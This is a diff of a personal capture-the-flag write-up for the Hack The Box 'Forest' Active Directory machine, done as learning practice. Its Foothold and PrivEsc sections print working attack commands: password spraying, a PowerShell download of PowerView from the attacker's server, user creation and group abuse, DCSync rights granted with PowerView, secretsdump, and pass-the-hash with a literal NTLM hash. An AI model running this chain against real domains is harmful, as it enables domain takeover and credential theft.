@@ -46,6 +46,9 @@ Created a list of Users and Service Principle Names from enum4linux output, whil
 ```bash
 cat enumFourLinux.txt | grep "has member" | awk -F ' ' '{ print $8 }' | grep HTB > usersPlusSPNs.txt
 ```
+
+## Exploit
+
 Watched some Ippsec to learn mote and add more to my LDAP cheatsheet, then paused video to make users.txt; for password spraying. Deleting the excess machine accounts so as to not waste time password spraying with crackmapexec.
 ![cme-smb-pass-pol](Screenshots/cme-smb-pass-pol.png)
 The account lockout threshold:0 means Bruteforcable
@@ -65,11 +68,91 @@ Then use the credentials to enumerate smb shares
 
 ![cme-share-enum](Screenshots/cme-enum-shares.png)
 
-
-## Exploit
-
 ## Foothold
+
+Then evil-winrm with those credentials onto the machine.
+
+![user](Screenshots/user.png)
+
+Then researched loads of impacket use cases, till I felt like I had a better idea about using it, then learnt how to setup a smb share with impacket-smbserver following along with the video:
+
+```bash
+impacket-smbserver scriptserver $(pwd) -smb2support -user user -password pass
+```
+On remote:
+```powershell
+$pass = convertto-securestring 'pass' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('user', $pass)
+New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP
+```
 
 ## PrivEsc
 
-      
+I instead of Bloodhound at first wanted to use [ADAPE](https://github.com/hausec/ADAPE-Script) and [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). Also general AD PrivEsc manually to add to me very lack luster Active Directory Privilege Escalation Cheastsheet.  I tried setting up an smbserver but I did not work then went to the trusty
+
+```powershell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$ip:$port/powerview.ps1','C:\Users\svc-alfresco\Desktop\powerview.ps1')"
+```
+
+ADAPE requires `set-executionpolicy bypass`, which `svc-alfresco` user can't set. I tried I powerview.ps1 and then remember the pain of trying to get sharphound to work in the earlier part of this year to no success so also tried that. 
+```bash
+ulimit -n 40000 
+# THEN
+sudo neo4j console
+# THEN goto localhost:7474
+```
+Default credentials
+USER: neo4j
+PASS: neo4j
+
+```bash
+cd /tmp; curl https://github.com/BloodHoundAD/SharpHound/releases/download/v1.0.4/SharpHound-v1.0.4.zip -oL SharpHound.zip
+
+```
+Use the same file transfer method as before
+```powershell
+.\SharpHound.exe -c all
+```
+
+```bash
+bloodhound --no-sandbox
+```
+Following along with Ippsec after the agony of SharpHound maddness. I needed to get smbserver to work to transfer host a server. So went back to retry making smbserver. It felt amazing making that finally work. Wow.
+Transfered the sharphound output zip file and dragged it into Bloodhound, watch some more Ippsec for how to go where to look - definately need to improve in this respect as to my person maentyal mapping to the groupings and how to fid weak points.
+
+![bh](Screenshots/bloodhound.png)
+
+Basically TL;DR/watch Ippsec explain is that the Account Operators Group can make accounts and svc-alfresco is part of that group and there is the Exchange server connected to it that the Account.
+```powershell
+net user $user $password /add /domain
+net group "Exchange Windows Permissions" /add $user
+```
+My Bloodhound did not represent the chain to DC from Exchange Windows Permissions group, so I used the `Reachable Highest Value Targets` query here
+This is not correct as some weird occured; following along 
+![bh3](Screenshots/bh-weird.png)
+
+![bh2](Screenshots/bh-abuse.png)
+
+And the full glory of the Forest Machine and Bloodhound:
+
+![bh4](Screenshots/fullglory.png)
+
+Cool thing I already uploaded powerview! 
+
+```powershell
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+# What Bloodhound suggested, it did not work.
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
+# Actual path: get the dev branch of PowerView
+# add the the end of the git clone -b dev
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity wallace -Rights DCSync
+# impacket tool secretsdump
+impacket-secretsdump htb/$user:password@ip
+crackmapexec smb $ip -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.95.210
+
+```
+
+
+
